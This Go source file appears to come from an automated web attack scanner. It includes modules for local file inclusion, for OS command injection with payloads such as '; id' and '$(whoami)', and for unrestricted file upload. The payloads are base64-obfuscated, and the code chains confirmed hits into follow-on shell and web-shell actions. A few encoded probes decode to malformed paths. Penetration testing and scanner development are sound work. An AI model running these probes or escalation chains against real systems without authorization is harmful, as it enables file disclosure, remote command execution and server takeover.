package hacker

import (
	"context"
	"encoding/base64"
	"fmt"
	"net/url"
	"strings"

	"github.com/NICE-DEV226/nice-Scan/internal/transport"
	"github.com/NICE-DEV226/nice-Scan/internal/types"
)

type LFIAction struct{}

func (a *LFIAction) Metadata() ActionMetadata {
	return ActionMetadata{
		Name:        "LFI Scanner",
		Description: "Path traversal tests on discovered endpoints",
		Priority:    65,
		Requires:    []string{"has_api"},
		Provides:    []string{"has_lfi"},
	}
}

// the loop used to base64-decode the same constant list on every request).
var lfiProbes = func() (out []string) {
	for _, b64p := range []string{
		"Li4vLi4vLi4vZXRjL3Bhc3N3ZA==",
		"Li4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==",
		"Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==",
		"Li4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==",
		// absolute forms also reach servers that reject the relative walk
		"L2V0Yy9wYXNzd2Q=",
		"Li4vLi4vLi4vd2luZG93cy93aW4uaW5p",
		"Li4vLi4vLi4vLi4vd2luZG93cy93aW4uaW5i",
		"Li4vLi4vLi4vLi4vZXRjL3dpbi5pbmktbGlrZT0=",
	} {
		p, err := base64.StdEncoding.DecodeString(b64p)
		if err == nil {
			out = append(out, string(p))
		}
	}
	return out
}()

func (a *LFIAction) Execute(ctx context.Context, target string, kb *Knowledge, client *transport.Client) ActionResult {
	var findings []Finding
	var spawned []Action

	endpoints := kb.GetEndpoints()
	for _, ep := range endpoints {
		params := extractURLParams(ep.Path)
		if !hasFileParam(ep.Path) && len(params) == 0 {
			continue
		}

		for _, param := range params {
			base := ep.Path
			if strings.Contains(base, "?") {
				parts := strings.SplitN(base, "?", 2)
				base = parts[0]
			}

			// Neutral round first: the baseline gate needs what this page
			// prints WITHOUT any traversal. A page that quotes passwd
			// records in its own text (tutorials, docs) must not lend
			// them to a payload echo.
			baselineBody := ""
			if baseResp, err := client.Do(ctx, &types.Request{Method: "GET", URL: base + "?" + param + "="}); err == nil && baseResp != nil {
				baselineBody = string(baseResp.Body)
			}

			for _, probe := range lfiProbes {
				select {
				case <-ctx.Done():
					return ActionResult{Findings: findings, Actions: spawned}
				default:
				}

				testURL := base + "?" + param + "=" + probe
				resp, err := client.Do(ctx, &types.Request{
					Method: "GET",
					URL:    testURL,
				})
				if err != nil {
					continue
				}

				// The only confirmation: a structural record the baseline
				// cannot echo. Keywords + length were the review's
				// tutorial-page false-positive class.
				hit := lfiShapeHit(string(resp.Body), baselineBody)
				if hit == "" {
					continue
				}

				findings = append(findings, Finding{
					Type:        "lfi_confirmed",
					Name:        fmt.Sprintf("LFI: param %s reads structural file record", param),
					Severity:    SevCritical,
					Description: fmt.Sprintf("Local file inclusion at param '%s' — record `%s` matched, absent from the baseline round", param, hit),
					Evidence:    hit + " @ " + testURL,
				})
				spawned = append(spawned, &LFIReadAction{
					vulnURL: testURL,
					param:   param,
				})
				break
			}
		}
	}

	return ActionResult{Findings: findings, Actions: spawned}
}

func hasFileParam(path string) bool {
	lowPath := strings.ToLower(path)
	indicators := []string{"file", "path", "dir", "include", "doc", "pg", "page", "root"}
	for _, ind := range indicators {
		if strings.Contains(lowPath, ind) {
			return true
		}
	}
	return false
}

type CMDInjectAction struct{}

func (a *CMDInjectAction) Metadata() ActionMetadata {
	return ActionMetadata{
		Name:        "CMD Injection",
		Description: "OS command injection tests via parameters",
		Priority:    70,
		Requires:    []string{"has_api"},
		Provides:    []string{"has_rce"},
		// Executes OS commands through the target — worst-case consent.
		Destructive: true,
	}
}

var cmdPayloadsB64 = []struct {
	name    string
	payload string
}{
	{name: "Basic id", payload: "OyBpZA=="},
	{name: "Pipe id", payload: "fCBpZA=="},
	{name: "And id", payload: "JiYgaWQ="},
	{name: "Backtick", payload: "YHdob2FtaWA="},
	{name: "Subshell", payload: "JCh3aG9hbWkp"},
}

var cmdIndicatorsB64 = []string{
	"dWlkPQ==",
	"Z2lkPQ==",
	"cm9vdA==",
	"d3d3LWRhdGE=",
}

func (a *CMDInjectAction) Execute(ctx context.Context, target string, kb *Knowledge, client *transport.Client) ActionResult {
	var findings []Finding
	var spawned []Action

	endpoints := kb.GetEndpoints()
	testTargets := endpoints

	if len(testTargets) == 0 {
		pages := kb.GetPages()
		for _, p := range pages {
			for _, param := range extractURLParams(p.URL) {
				f, u := testCMDPayload(ctx, client, p.URL, param)
				if f != nil {
					findings = append(findings, *f)
					// Only a marker-confirmed execution queues the shell;
					// a suspect verdict (u == "") must not spray commands.
					if u != "" {
						spawned = append(spawned, &CMDShellAction{vulnURL: u, param: param})
					}
				}
			}
		}
		return ActionResult{Findings: findings, Actions: spawned}
	}

	for _, ep := range testTargets {
		for _, param := range extractURLParams(ep.Path) {
			f, u := testCMDPayload(ctx, client, ep.Path, param)
			if f != nil {
				findings = append(findings, *f)
				if u != "" {
					spawned = append(spawned, &CMDShellAction{vulnURL: u, param: param})
				}
			}
		}
	}

	return ActionResult{Findings: findings, Actions: spawned}
}

func testCMDPayload(ctx context.Context, client *transport.Client, baseURL, param string) (*Finding, string) {
	// Differential baseline: an indicator that is ALREADY on the page
	// (HTML id="root", a "www-data" changelog) proves nothing when the
	// injected response still contains it. Only text that APPEARS with the
	// payload is a lead.
	baseline := ""
	if resp, err := client.Do(ctx, &types.Request{Method: "GET", URL: baseURL}); err == nil && resp != nil {
		baseline = strings.ToLower(string(resp.Body))
	}

	for _, cmd := range cmdPayloadsB64 {
		payload, err := base64.StdEncoding.DecodeString(cmd.payload)
		if err != nil {
			continue
		}

		testURL := baseURL
		// The payload must be query-escaped: "; id" carries a space and
		// servers answer 400 Bad Request to raw whitespace in the URL —
		// every probe died before the wire, and the detector saw nothing.
		if strings.Contains(testURL, "?") {
			testURL += "&" + param + "=" + url.QueryEscape(string(payload))
		} else {
			testURL += "?" + param + "=" + url.QueryEscape(string(payload))
		}

		resp, err := client.Do(ctx, &types.Request{
			Method: "GET",
			URL:    testURL,
		})
		if err != nil || resp == nil {
			continue
		}

		lowBody := strings.ToLower(string(resp.Body))
		indicator := ""
		for _, b64ind := range cmdIndicatorsB64 {
			ind, err := base64.StdEncoding.DecodeString(b64ind)
			if err != nil {
				continue
			}
			s := strings.ToLower(string(ind))
			if strings.Contains(lowBody, s) && !strings.Contains(baseline, s) {
				indicator = s
				break
			}
		}
		if indicator == "" {
			continue
		}

		// The keyword differential is only a LEAD: a server that echoes
		// query parameters back renders "uid=" without executing
		// anything. The executed fact needs the echo-marker window.
		if uid := cmdMarkerProbe(ctx, client, baseURL, param); uid != "" {
			return &Finding{
				Type:        "cmd_injection",
				Name:        fmt.Sprintf("CMD injection executed: marked 'id' returned %s via %s", uid, param),
				Severity:    SevCritical,
				Description: "Command output appeared inside the echo-marker window — reflection cannot produce this",
				Evidence:    testURL,
			}, testURL
		}

		return &Finding{
			Type:        "cmd_injection_suspect",
			Name:        fmt.Sprintf("CMD injection suspected: '%s' appeared only with the injection payload on %s", indicator, param),
			Severity:    SevMedium,
			Description: "Differential keyword present, but the marked 'id' probe returned no executed output — the server may just echo query parameters. Verify manually before treating this as RCE; no shell action was queued",
			Evidence:    testURL,
		}, ""
	}
	return nil, ""
}

// cmdMarkerProbe settles "did it execute?" with the same discipline as
// CMDShellAction: ; echo nsxCMDE7BE"GIN"; id; echo nsxCMDE7"END". A URL
// reflection echoes the quotes and can never open the clean window, so a
// uid line inside it is strictly an executed fact.
func cmdMarkerProbe(ctx context.Context, client *transport.Client, baseURL, param string) string {
	cleanBase := baseURL
	if idx := strings.Index(cleanBase, "?"); idx > 0 {
		cleanBase = cleanBase[:idx]
	}
	idCmd, err := base64.StdEncoding.DecodeString(cmdIDB64)
	if err != nil {
		return ""
	}
	resp, err := client.Do(ctx, &types.Request{
		Method: "GET",
		URL:    cmdShellURL(cleanBase, param, string(idCmd)),
	})
	if err != nil || resp == nil {
		return ""
	}
	return rxUIDLine.FindString(cmdMarkedWindow(string(resp.Body)))
}

type UploadAction struct{}

func (a *UploadAction) Metadata() ActionMetadata {
	return ActionMetadata{
		Name:        "Upload Exploitation",
		Description: "Test upload endpoints for unrestricted file upload",
		Priority:    75,
		Requires:    []string{"has_upload"},
		Provides:    []string{"has_upload_exploit"},
		// State-changing (uploads arbitrary files). Only when an upload
		// endpoint was actually observed (e.g. a form with a file input
		// field was fetched), never from page-text hints.
		Sensitive:   true,
		Destructive: true,
	}
}

func (a *UploadAction) Execute(ctx context.Context, target string, kb *Knowledge, client *transport.Client) ActionResult {
	var findings []Finding
	var spawned []Action

	pages := kb.GetPages()
	for _, page := range pages {
		if !hasFileParam(page.URL) {
			continue
		}

		uploads := []struct {
			filename string
			ctype    string
		}{
			{"test.php", "application/x-php"},
			{"test.php5", "application/x-php"},
			{"test.phtml", "application/x-php"},
			{"test.aspx", "text/plain"},
			{"test.jsp", "text/plain"},
			{"test.php.jpg", "image/jpeg"},
		}

		for _, up := range uploads {
			select {
			case <-ctx.Done():
				return ActionResult{Findings: findings, Actions: spawned}
			default:
			}

			// Upload a BENIGN unique marker (never a web shell here). The
			// honest "unrestricted upload" verdict requires reading that
			// marker back from the server: POSTing and getting a 200 proves
			// nothing, since most endpoints answer 200 to anything. PHP/ASP
			// markers will not echo (the server executes or stores them), so
			// those simply fail retrieval — that is the correct outcome;
			// execution proof is WebShellAction's separate, marked-id job.
			marker := uploadMarker()
			storedURL, retrieved := retrieveUploadMarker(ctx, client, page.URL, up.filename, up.ctype, marker)

			if retrieved {
				findings = append(findings, Finding{
					Type:        "upload_confirmed",
					Name:        fmt.Sprintf("Unrestricted file upload confirmed: %s", up.filename),
					Severity:    SevMedium,
					Description: fmt.Sprintf("The endpoint stored the uploaded %s and served it back at %s — the scanner read its unique marker from that URL (arbitrary file write; execution not demonstrated here)", up.filename, storedURL),
					Evidence:    storedURL,
					Details: map[string]string{
						"filename":   up.filename,
						"stored_url": storedURL,
						"method":     "multipart-marker-retrieval",
					},
				})
			} else {
				// Accepted-but-unresolved uploads are an observation, not a
				// finding: no file was shown to be stored or served. Record
				// it at SevInfo so the operator can look, without the old
				// "200 + no error word" minting a Critical RCE headline.
				findings = append(findings, Finding{
					Type:        "upload_accepted_unverified",
					Name:        fmt.Sprintf("Upload endpoint accepted a well-formed POST for %s (storage unconfirmed)", up.filename),
					Severity:    SevInfo,
					Description: "The endpoint returned success for a genuine multipart file POST, but the marker could not be retrieved from any same-origin path — the scanner cannot claim an upload without read-back proof",
					Evidence:    page.URL,
					Details:     map[string]string{"filename": up.filename, "status": "not-verified"},
				})
			}

			// This is a real upload surface; escalate to the web-shell path
			// which self-verifies (it only reports RCE when its marked id
			// probe returns executed output). Pass the POST endpoint and the
			// origin so the shell probe resolves real URLs, not empty ones.
			spawned = append(spawned, &WebShellAction{
				vulnURL:   page.URL,
				uploadURL: uploadOrigin(page.URL),
				filename:  strings.TrimSuffix(up.filename, ".jpg"),
			})
			break
		}
	}

	return ActionResult{Findings: findings, Actions: spawned}
}

// uploadOrigin returns scheme://host for a URL so WebShellAction can build
// <origin>/<shell name> probe paths instead of concatenating onto a page path.
func uploadOrigin(pageURL string) string {
	u, err := url.Parse(pageURL)
	if err != nil {
		return strings.TrimRight(pageURL, "/")
	}
	return u.Scheme + "://" + u.Host
}
